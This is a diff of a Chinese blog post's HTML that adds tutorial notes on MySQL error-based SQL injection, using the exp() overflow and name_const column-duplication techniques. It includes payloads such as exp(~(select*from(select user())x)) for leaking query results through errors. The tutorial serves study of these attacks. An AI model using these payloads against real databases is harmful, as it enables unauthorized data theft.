@@ -214,7 +214,11 @@
 <meta property="og:image" content="https://i.screenshot.net/y89eotp">
 <meta property="og:image" content="https://i.screenshot.net/194y1hv">
 <meta property="og:image" content="https://i.screenshot.net/1po1ybm">
-<meta property="og:updated_time" content="2018-11-13T03:31:34.975Z">
+<meta property="og:image" content="https://i.screenshot.net/x6gx4cd">
+<meta property="og:image" content="https://i.screenshot.net/xdy2gcn">
+<meta property="og:image" content="https://i.screenshot.net/x4k78fm">
+<meta property="og:image" content="https://i.screenshot.net/xjzpos5">
+<meta property="og:updated_time" content="2018-11-14T08:39:17.859Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入杂谈">
 <meta name="twitter:description" content="有人说，你发说说连一个朋友回应都没有，列表的也都是些有的没的，没错啊，发说说就是不希望有朋友看到，不管什么时候，带着面具的日子过够了，只想有个无人打扰的空间，不必担心别人内心的想法，尽情释放自己的喜怒哀乐。  老生常谈的话题，早在2015年的阿里峰会上，长亭的陈宇森同学就曾发表《永别了，SQL注入》一文，但作为最古老而又经典的攻击方式，仍值得我们去学习，去探索，正好协会里有想学习的，这里即作为笔记">
@@ -466,7 +470,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2018-11-13 11:31:34" itemprop="dateModified" datetime="2018-11-13T11:31:34+08:00">2018-11-13</time>
+                <time title="Updated at: 2018-11-14 16:39:17" itemprop="dateModified" datetime="2018-11-14T16:39:17+08:00">2018-11-14</time>
               
             
           </span>
@@ -786,6 +790,33 @@ information_schema.tables group by name)b)%23
 <p>注意：在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p>
 <p>测试如下：</p>
 <p><img src="https://i.screenshot.net/1po1ybm" alt=""></p>
+<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<p><img src="https://i.screenshot.net/x6gx4cd" alt=""></p>
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<p><img src="https://i.screenshot.net/xdy2gcn" alt=""></p>
+<p><img src="https://i.screenshot.net/x4k78fm" alt=""></p>
+<p>exp函数的作用：</p>
+<p>此函数返回e(自然对数的底)到X次方的值此函数返回e(自然对数的底)的X次方的值</p>
+<p>如：</p>
+<blockquote>
+<p>mysql&gt; select exp(709);<br>+———————–+<br>| exp(709)              |<br>+———————–+<br>| 8.218407461554972e307 |<br>+———————–+<br>1 row in set (0.00 sec)</p>
+</blockquote>
+<blockquote>
+<p>mysql&gt; select exp(710);<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(710)’</p>
+</blockquote>
+<p>注入姿势：</p>
+<blockquote>
+<p>mysql&gt; select exp(~(select*from(select user())x));</p>
+</blockquote>
+<p>5.5.47版本下的</p>
+<blockquote>
+<p>mysql&gt; select (select(!x-~0)from(select(select user())x)a);</p>
+</blockquote>
+<p>大于5.5.53时则不能返回查询结果。</p>
+<h4 id="列名重复报错注入"><a href="#列名重复报错注入" class="headerlink" title="列名重复报错注入"></a>列名重复报错注入</h4><p>mysql列名重复会报错，我们利用name_const来制造一个列：</p>
+<p><img src="https://i.screenshot.net/xjzpos5" alt=""></p>
+<p>根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>这个…报错方式很多，组合利用就好，根据版本、长度选择合适的报错语法…</p>
 
       
     </div>
@@ -808,7 +839,7 @@ information_schema.tables group by name)b)%23
   <p><span>本文标题:</span><a href="/SQL注入杂谈/">SQL注入杂谈</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
   <p><span>发布时间:</span>2018年11月11日 - 14:11</p>
-  <p><span>最后更新:</span>2018年11月13日 - 11:11</p>
+  <p><span>最后更新:</span>2018年11月14日 - 16:11</p>
   <p><span>原始链接:</span><a href="/SQL注入杂谈/" title="SQL注入杂谈">https://lengjibo.github.io/SQL注入杂谈/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/SQL注入杂谈/"  aria-label="复制成功！"></i></span>
   </p>
@@ -1170,7 +1201,7 @@ information_schema.tables group by name)b)%23
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入前奏"><span class="nav-number">1.</span> <span class="nav-text">SQL注入前奏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本的sql语法知识"><span class="nav-number">1.1.</span> <span class="nav-text">基本的sql语法知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本常见语法"><span class="nav-number">1.1.1.</span> <span class="nav-text">基本常见语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#select语句"><span class="nav-number">1.1.2.</span> <span class="nav-text">select语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#insert-into语句"><span class="nav-number">1.1.3.</span> <span class="nav-text">insert into语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UPDATE-语句"><span class="nav-number">1.1.4.</span> <span class="nav-text">UPDATE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ORDER-BY-关键字"><span class="nav-number">1.1.5.</span> <span class="nav-text">ORDER BY 关键字</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.2.</span> <span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#万能密码详解"><span class="nav-number">1.3.</span> <span class="nav-text">万能密码详解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见SQL注入讲解"><span class="nav-number">2.</span> <span class="nav-text">常见SQL注入讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#报错型注入"><span class="nav-number">2.1.</span> <span class="nav-text">报错型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor型报错"><span class="nav-number">2.1.1.</span> <span class="nav-text">floor型报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue-报错注入"><span class="nav-number">2.1.2.</span> <span class="nav-text">extractvalue()报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml-报错注入"><span class="nav-number">2.1.3.</span> <span class="nav-text">updatexml()报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#几何函数报错"><span class="nav-number">2.1.4.</span> <span class="nav-text">几何函数报错</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#GeometryCollection"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">GeometryCollection()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#polygon"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">polygon()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#multipoint"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">multipoint()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#multilinestring"><span class="nav-number">2.1.4.4.</span> <span class="nav-text">multilinestring()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#linestring"><span class="nav-number">2.1.4.5.</span> <span class="nav-text">linestring()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#multipolygon"><span class="nav-number">2.1.4.6.</span> <span class="nav-text">multipolygon()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-报错注入"><span class="nav-number">2.1.5.</span> <span class="nav-text">exp()报错注入</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入前奏"><span class="nav-number">1.</span> <span class="nav-text">SQL注入前奏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本的sql语法知识"><span class="nav-number">1.1.</span> <span class="nav-text">基本的sql语法知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本常见语法"><span class="nav-number">1.1.1.</span> <span class="nav-text">基本常见语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#select语句"><span class="nav-number">1.1.2.</span> <span class="nav-text">select语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#insert-into语句"><span class="nav-number">1.1.3.</span> <span class="nav-text">insert into语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UPDATE-语句"><span class="nav-number">1.1.4.</span> <span class="nav-text">UPDATE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ORDER-BY-关键字"><span class="nav-number">1.1.5.</span> <span class="nav-text">ORDER BY 关键字</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.2.</span> <span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#万能密码详解"><span class="nav-number">1.3.</span> <span class="nav-text">万能密码详解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见SQL注入讲解"><span class="nav-number">2.</span> <span class="nav-text">常见SQL注入讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#报错型注入"><span class="nav-number">2.1.</span> <span class="nav-text">报错型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor型报错"><span class="nav-number">2.1.1.</span> <span class="nav-text">floor型报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue-报错注入"><span class="nav-number">2.1.2.</span> <span class="nav-text">extractvalue()报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml-报错注入"><span class="nav-number">2.1.3.</span> <span class="nav-text">updatexml()报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#几何函数报错"><span class="nav-number">2.1.4.</span> <span class="nav-text">几何函数报错</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#GeometryCollection"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">GeometryCollection()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#polygon"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">polygon()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#multipoint"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">multipoint()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#multilinestring"><span class="nav-number">2.1.4.4.</span> <span class="nav-text">multilinestring()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#linestring"><span class="nav-number">2.1.4.5.</span> <span class="nav-text">linestring()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#multipolygon"><span class="nav-number">2.1.4.6.</span> <span class="nav-text">multipolygon()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-报错注入"><span class="nav-number">2.1.5.</span> <span class="nav-text">exp()报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列名重复报错注入"><span class="nav-number">2.1.6.</span> <span class="nav-text">列名重复报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结："><span class="nav-number">2.1.7.</span> <span class="nav-text">总结：</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
